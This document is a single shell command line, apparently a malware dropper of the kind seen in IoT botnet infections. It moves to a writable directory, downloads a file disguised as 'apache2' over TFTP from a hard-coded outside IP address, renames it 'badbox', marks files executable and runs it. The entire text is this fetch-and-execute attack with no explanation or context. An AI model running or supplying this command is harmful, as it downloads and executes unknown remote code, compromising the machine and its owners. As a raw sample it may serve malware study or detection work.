cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 198.167.140.19;cat apache2 >badbox;chmod +x *;./badbox
